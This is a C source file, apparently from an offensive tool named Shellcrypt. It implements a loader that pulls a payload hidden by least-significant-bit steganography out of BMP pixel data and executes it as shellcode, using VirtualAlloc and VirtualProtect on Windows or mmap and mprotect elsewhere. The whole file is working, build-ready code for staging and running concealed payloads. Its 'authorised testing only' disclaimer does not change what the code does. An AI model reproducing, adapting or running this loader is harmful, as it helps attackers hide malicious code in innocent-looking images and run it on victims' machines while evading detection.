/*
 * steg_loader.c — Steganography resource loader for Shellcrypt
 *
 * Extracts an LSB-embedded payload from a BMP carrier image and
 * executes it as shellcode.  Matches the wire format produced by
 * Shellcrypt's --steg-embed:
 *
 *   [32 bits]  payload length (big-endian), 1 bit per pixel sample
 *   [N bytes]  payload data,               1 bit per pixel sample
 *
 * The loader reads raw pixel data straight from the BMP DIB, so it
 * needs no image library — just the Windows API for VirtualAlloc.
 *
 * Build (MSVC / x64 Native Tools):
 *   cl /O2 /W4 steg_loader.c /Fe:steg_loader.exe
 *
 * Build (MinGW-w64):
 *   x86_64-w64-mingw32-gcc -O2 -Wall -o steg_loader.exe steg_loader.c
 *
 * Usage:
 *   steg_loader.exe <carrier.bmp> [bits_per_channel]
 *
 *   bits_per_channel defaults to 1 (must match the value used at embed time).
 *
 * -----------------------------------------------------------------------
 * EDUCATIONAL / AUTHORISED TESTING ONLY.
 * This code is part of the Shellcrypt test suite for validating that the
 * steganography module produces output a real loader can consume.
 * -----------------------------------------------------------------------
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#endif

/* ── BMP structures (packed) ─────────────────────────────────────────── */

#pragma pack(push, 1)

typedef struct {
    uint16_t bfType;       /* 'BM' */
    uint32_t bfSize;
    uint16_t bfReserved1;
    uint16_t bfReserved2;
    uint32_t bfOffBits;    /* offset to pixel data */
} BMPFileHeader;

typedef struct {
    uint32_t biSize;
    int32_t  biWidth;
    int32_t  biHeight;
    uint16_t biPlanes;
    uint16_t biBitCount;   /* 24 or 32 */
    uint32_t biCompression;
    uint32_t biSizeImage;
    int32_t  biXPelsPerMeter;
    int32_t  biYPelsPerMeter;
    uint32_t biClrUsed;
    uint32_t biClrImportant;
} BMPInfoHeader;

#pragma pack(pop)

/* ── Helpers ─────────────────────────────────────────────────────────── */

/*
 * read_file — slurp a file into a malloc'd buffer.
 * Caller must free() the returned pointer.
 */
static uint8_t *read_file(const char *path, size_t *out_len)
{
    FILE *fp = fopen(path, "rb");
    if (!fp) {
        fprintf(stderr, "[-] Cannot open '%s'\n", path);
        return NULL;
    }
    fseek(fp, 0, SEEK_END);
    long len = ftell(fp);
    if (len <= 0) { fclose(fp); return NULL; }
    fseek(fp, 0, SEEK_SET);

    uint8_t *buf = (uint8_t *)malloc((size_t)len);
    if (!buf) { fclose(fp); return NULL; }
    if (fread(buf, 1, (size_t)len, fp) != (size_t)len) {
        free(buf);
        fclose(fp);
        return NULL;
    }
    fclose(fp);
    *out_len = (size_t)len;
    return buf;
}

/*
 * extract_lsb — pull a hidden payload out of raw pixel samples.
 *
 * samples     : pointer to the first colour-channel byte
 * n_samples   : total number of channel bytes available
 * bpc         : bits per channel (1–4, must match embed time)
 * out_len     : receives the payload length
 *
 * Returns a malloc'd buffer with the payload, or NULL on error.
 */
static uint8_t *extract_lsb(const uint8_t *samples, size_t n_samples,
                             int bpc, uint32_t *out_len)
{
    uint8_t mask = (uint8_t)((1 << bpc) - 1);
    int steps_per_byte = 8 / bpc;   /* how many samples make one byte */

    /* ── read 4-byte big-endian length header ── */
    size_t hdr_samples = (size_t)(32 / bpc);  /* 32 header bits */
    if (n_samples < hdr_samples) {
        fprintf(stderr, "[-] Image too small for header\n");
        return NULL;
    }

    uint8_t len_bytes[4] = {0};
    size_t si = 0;  /* sample index */
    for (int bi = 0; bi < 4; bi++) {
        uint8_t byte_val = 0;
        for (int s = 0; s < steps_per_byte; s++) {
            byte_val = (uint8_t)((byte_val << bpc) | (samples[si++] & mask));
        }
        len_bytes[bi] = byte_val;
    }

    uint32_t payload_len = ((uint32_t)len_bytes[0] << 24)
                         | ((uint32_t)len_bytes[1] << 16)
                         | ((uint32_t)len_bytes[2] <<  8)
                         | ((uint32_t)len_bytes[3]);

    if (payload_len == 0) {
        *out_len = 0;
        return NULL;
    }

    size_t total_samples_needed = hdr_samples + (size_t)payload_len * (size_t)steps_per_byte;
    if (total_samples_needed > n_samples) {
        fprintf(stderr, "[-] Payload length %u exceeds image capacity\n", payload_len);
        return NULL;
    }

    /* ── read payload ── */
    uint8_t *payload = (uint8_t *)malloc(payload_len);
    if (!payload) return NULL;

    for (uint32_t bi = 0; bi < payload_len; bi++) {
        uint8_t byte_val = 0;
        for (int s = 0; s < steps_per_byte; s++) {
            byte_val = (uint8_t)((byte_val << bpc) | (samples[si++] & mask));
        }
        payload[bi] = byte_val;
    }

    *out_len = payload_len;
    return payload;
}

/*
 * bmp_get_samples — return a pointer to the raw pixel samples in
 * top-to-bottom, left-to-right, channel order (matching Pillow's
 * getdata() output).
 *
 * BMP stores rows bottom-to-top with per-row padding.  This function
 * re-orders them into a flat sample array so the LSB extraction matches
 * what Shellcrypt's Python embed produces.
 *
 * Returns a malloc'd buffer; caller frees.  *n_samples receives the
 * total number of channel bytes.
 */
static uint8_t *bmp_get_samples(const uint8_t *file_buf, size_t file_len,
                                size_t *n_samples)
{
    if (file_len < sizeof(BMPFileHeader) + sizeof(BMPInfoHeader)) {
        fprintf(stderr, "[-] File too small for BMP headers\n");
        return NULL;
    }

    const BMPFileHeader *fh = (const BMPFileHeader *)file_buf;
    if (fh->bfType != 0x4D42) {   /* 'BM' little-endian */
        fprintf(stderr, "[-] Not a BMP file (signature: 0x%04X)\n", fh->bfType);
        return NULL;
    }

    const BMPInfoHeader *ih = (const BMPInfoHeader *)(file_buf + sizeof(BMPFileHeader));

    int channels;
    if (ih->biBitCount == 32)      channels = 4;   /* BGRA */
    else if (ih->biBitCount == 24) channels = 3;   /* BGR  */
    else {
        fprintf(stderr, "[-] Unsupported BMP bit depth: %u\n", ih->biBitCount);
        return NULL;
    }

    if (ih->biCompression != 0 /* BI_RGB */ && ih->biCompression != 3 /* BI_BITFIELDS */) {
        fprintf(stderr, "[-] Unsupported BMP compression: %u\n", ih->biCompression);
        return NULL;
    }

    int32_t  width  = ih->biWidth;
    int32_t  height = ih->biHeight;
    int top_down = 0;
    if (height < 0) { height = -height; top_down = 1; }

    /* BMP rows are padded to 4-byte boundaries */
    uint32_t row_bytes_raw = (uint32_t)(width * channels);
    uint32_t row_stride     = (row_bytes_raw + 3u) & ~3u;

    uint32_t pixel_offset = fh->bfOffBits;
    if ((size_t)pixel_offset + (size_t)row_stride * (size_t)height > file_len) {
        fprintf(stderr, "[-] BMP pixel data extends past end of file\n");
        return NULL;
    }

    /*
     * Shellcrypt embeds into BMP using RGB mode (3 channels per pixel,
     * matching what Pillow saves to a 24bpp BMP).  BMP stores channels
     * as BGR bottom-to-top with row padding; we reorder to RGB
     * top-to-bottom to match the Python embed's sample order.
     *
     * For 32bpp BMP (BGRA) we emit RGBA to match Pillow's RGBA mode.
     */
    int out_channels = (channels == 4) ? 4 : 3;
    size_t total = (size_t)width * (size_t)height * (size_t)out_channels;
    uint8_t *out = (uint8_t *)malloc(total);
    if (!out) return NULL;

    size_t oi = 0;
    for (int32_t row = 0; row < height; row++) {
        /* Pillow walks top-to-bottom */
        int32_t src_row = top_down ? row : (height - 1 - row);
        const uint8_t *rp = file_buf + pixel_offset + (size_t)src_row * row_stride;

        for (int32_t col = 0; col < width; col++) {
            const uint8_t *px = rp + (size_t)col * (size_t)channels;
            /* BMP is BGR(A); Pillow embed uses RGB or RGBA */
            out[oi++] = px[2];              /* R */
            out[oi++] = px[1];              /* G */
            out[oi++] = px[0];              /* B */
            if (channels == 4)
                out[oi++] = px[3];          /* A (only for 32bpp) */
        }
    }

    *n_samples = total;
    return out;
}

/* ── Shellcode execution ─────────────────────────────────────────────── */

static int exec_shellcode(const uint8_t *code, size_t len)
{
    if (len == 0) {
        fprintf(stderr, "[-] Empty payload, nothing to execute\n");
        return 1;
    }

#ifdef _WIN32
    void *mem = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE,
                             PAGE_READWRITE);
    if (!mem) {
        fprintf(stderr, "[-] VirtualAlloc failed (%lu)\n", GetLastError());
        return 1;
    }
    memcpy(mem, code, len);

    DWORD old_protect;
    if (!VirtualProtect(mem, len, PAGE_EXECUTE_READ, &old_protect)) {
        fprintf(stderr, "[-] VirtualProtect failed (%lu)\n", GetLastError());
        VirtualFree(mem, 0, MEM_RELEASE);
        return 1;
    }

    printf("[+] Executing %zu bytes of shellcode...\n", len);
    ((void(*)())mem)();

    /* If we return, clean up */
    VirtualFree(mem, 0, MEM_RELEASE);
#else
    void *mem = mmap(NULL, len, PROT_READ | PROT_WRITE,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) {
        perror("[-] mmap");
        return 1;
    }
    memcpy(mem, code, len);

    if (mprotect(mem, len, PROT_READ | PROT_EXEC) != 0) {
        perror("[-] mprotect");
        munmap(mem, len);
        return 1;
    }

    printf("[+] Executing %zu bytes of shellcode...\n", len);
    ((void(*)())mem)();

    munmap(mem, len);
#endif

    return 0;
}

/* ── Dump mode (--dump) ──────────────────────────────────────────────── */

static void dump_payload(const uint8_t *buf, uint32_t len, const char *outpath)
{
    if (outpath) {
        FILE *fp = fopen(outpath, "wb");
        if (!fp) { perror("[-] fopen"); return; }
        fwrite(buf, 1, len, fp);
        fclose(fp);
        printf("[+] Wrote %u bytes to '%s'\n", len, outpath);
    } else {
        printf("[+] Extracted %u bytes:\n", len);
        for (uint32_t i = 0; i < len; i++) {
            printf("%02x", buf[i]);
            if ((i + 1) % 16 == 0) printf("\n");
            else                    printf(" ");
        }
        if (len % 16 != 0) printf("\n");
    }
}

/* ── Entry point ─────────────────────────────────────────────────────── */

static void usage(const char *prog)
{
    printf(
        "Shellcrypt steganography resource loader\n"
        "\n"
        "Usage:\n"
        "  %s <carrier.bmp> [options]\n"
        "\n"
        "Options:\n"
        "  --bpc N      Bits per channel (1-4, default 1)\n"
        "  --dump       Print extracted payload hex (don't execute)\n"
        "  --dump-to F  Write extracted payload to file F\n"
        "  --exec       Extract and execute payload (default)\n"
        "  -h, --help   Show this help\n"
        "\n"
        "The BMP must be produced by shellcrypt --steg-embed.\n"
        "The --bpc value must match the --steg-bits used at embed time.\n",
        prog
    );
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        usage(argv[0]);
        return 1;
    }

    const char *bmp_path = NULL;
    const char *dump_path = NULL;
    int bpc = 1;
    int mode_dump = 0;  /* 0 = exec, 1 = dump */

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
            usage(argv[0]);
            return 0;
        } else if (strcmp(argv[i], "--bpc") == 0 && i + 1 < argc) {
            bpc = atoi(argv[++i]);
        } else if (strcmp(argv[i], "--dump") == 0) {
            mode_dump = 1;
        } else if (strcmp(argv[i], "--dump-to") == 0 && i + 1 < argc) {
            mode_dump = 1;
            dump_path = argv[++i];
        } else if (strcmp(argv[i], "--exec") == 0) {
            mode_dump = 0;
        } else if (argv[i][0] != '-') {
            bmp_path = argv[i];
        } else {
            fprintf(stderr, "[-] Unknown option: %s\n", argv[i]);
            return 1;
        }
    }

    if (!bmp_path) {
        fprintf(stderr, "[-] No BMP path specified\n");
        return 1;
    }
    if (bpc < 1 || bpc > 4) {
        fprintf(stderr, "[-] --bpc must be 1-4\n");
        return 1;
    }

    /* ── Load BMP ── */
    size_t file_len = 0;
    uint8_t *file_buf = read_file(bmp_path, &file_len);
    if (!file_buf) return 1;

    printf("[+] Loaded '%s' (%zu bytes)\n", bmp_path, file_len);

    /* ── Flatten pixel data to RGBA sample order ── */
    size_t n_samples = 0;
    uint8_t *samples = bmp_get_samples(file_buf, file_len, &n_samples);
    free(file_buf);
    if (!samples) return 1;

    printf("[+] %zu pixel samples, bpc=%d, max capacity ~%zu bytes\n",
           n_samples, bpc, (n_samples * (size_t)bpc - 32) / 8);

    /* ── Extract LSB payload ── */
    uint32_t payload_len = 0;
    uint8_t *payload = extract_lsb(samples, n_samples, bpc, &payload_len);
    free(samples);

    if (!payload || payload_len == 0) {
        fprintf(stderr, "[-] No payload found\n");
        free(payload);
        return 1;
    }

    printf("[+] Extracted %u bytes from carrier\n", payload_len);

    /* ── Dump or execute ── */
    int ret;
    if (mode_dump) {
        dump_payload(payload, payload_len, dump_path);
        ret = 0;
    } else {
        ret = exec_shellcode(payload, payload_len);
    }

    free(payload);
    return ret;
}
